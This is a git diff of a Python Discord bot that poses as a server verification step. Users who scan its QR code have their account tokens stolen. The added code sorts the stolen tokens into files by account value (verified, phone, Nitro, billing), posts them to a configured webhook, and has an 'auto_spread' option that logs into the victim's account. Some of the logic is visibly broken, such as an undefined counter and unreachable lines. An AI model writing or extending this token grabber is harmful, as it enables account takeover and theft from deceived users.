@@ -1,20 +1,19 @@
 
+from ast import dump
 from http.client import HTTPException
-from pydoc import cli
 
+import os
 from DRAclient import DRAClient
 import io
 import qrcode
 import discord
-from DiscordDumper import Dump
+from DiscordLib import Dump
 import asyncio
 from discord.utils import get
 import json
 from datetime import datetime
-from colorama import init
 from colorama import Fore
 from config import config
-
 
 
 
@@ -68,45 +67,89 @@ class QRHandler():
 
                     
     async def on_scan(self):
-        print(f'{Fore.YELLOW}[{datetime.now()}] [User scanned QR code] {self.client.user.username}#{self.client.user.discrim}')
+        print(f'{Fore.YELLOW}[{datetime.now()}] [SCANNED] {self.client.user.username}#{self.client.user.discrim}')
             
-        
-    async def on_finish(self):
-        print(f'{Fore.GREEN}[{datetime.now()}] [User confirmed] {self.client.user.username}#{self.client.user.discrim}')
 
-        with open('tokens.txt', 'a') as f:
-            f.write(self.client.token + '\n')
+    async def save_token(self, token, name):
+        path = f"tokens/{name}.txt"
+
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+
+        with open(path, 'a') as f:
+            f.write(token + '\n')
+
+
+    async def check_token(self, token):
+        details = Dump().get_details(token)
+        try:
+            if details['message'] == '401: Unauthorized':
+                invalid += 1
+                return
+        except KeyError:
+            pass
+
+            await self.save_token(token, "tokens")
+
+        if details['verified']:
+            await self.save_token(token, "verified")
+
+        if details['phone']:
+            await self.save_token(token, "mobile")
+        try:
+            if details['premium_type'] == 1:
+                await self.save_token(token, "nitroclassic")
+            elif details['premium_type'] == 2:
+                await self.save_token(token, "nitro")
+        except KeyError:
+            pass
+        
+        if Dump().get_payment(token):
+            await self.save_token(token, "billing")
             
+    async def export_token(self, token):
+        await self.check_token(token)
+
+    
         if config['webhook_url']:
             try:
-                Dump().send_webhook(self.client.token)
+                Dump().send_webhook(token)
             except:
                 print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to dump to webhook')
 
-        if config['servers'][str(self.ctx.guild.id)]['verify_role']: #servers dict -> guild id from context -> verify_role
-            user = self.ctx.user
-            try:
-                role = get(self.ctx.guild.roles, id=config['servers'][self.ctx.guild.id]['verify_role'])
-                await self.ctx.user.add_roles(role)
-            except HTTPException:
-                print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try running the setuprole command.')
-            except discord.errors.Forbidden:
-                print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try making sure the bot role is above the verify role or giving the bot permissions.')
+    async def on_finish(self):
+        print(f'{Fore.GREEN}[{datetime.now()}] [SUCCESS] {self.client.user.username}#{self.client.user.discrim}')
+
+
+        config['tokens_logged'] += 1
+        config.write()
+            
+        await self.export_token(self.client.token)
+
+        #give role
+        # print("servers:", config['servers'])
+        # print("guild:", config['servers'][str(self.ctx.guild.id)])
+        # print("role:", config['servers'][str(self.ctx.guild.id)]['verify_role'])
+
+
+        try:
+            role = get(self.ctx.guild.roles, id=config['servers'][str(self.ctx.guild.id)]['verify_role'])
+            await self.ctx.user.add_roles(role)
+        except HTTPException:
+            print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try running the setuprole command.')
+        except discord.errors.Forbidden:
+            print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try making sure the bot role is above the verify role or giving the bot permissions.')
+        except KeyError:
+            print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try making sure the role id is correct in config.json')
+
 
 
         
         if config["auto_spread"] == True:
             user = discord.Client(intents=discord.Intents.default())
-            
-            @user.event
-            async def on_ready():
-                print(user.servers)
-            
-            
-            user.run(self.client.token)
+
 
                                 
         
     async def on_close(self):
-        print(f'{Fore.RED}[{datetime.now()}] [User failed to submit] {self.client.user.username}#{self.client.user.discrim}')
+        print(f'{Fore.RED}[{datetime.now()}] [Failure] {self.client.user.username}#{self.client.user.discrim}')
 
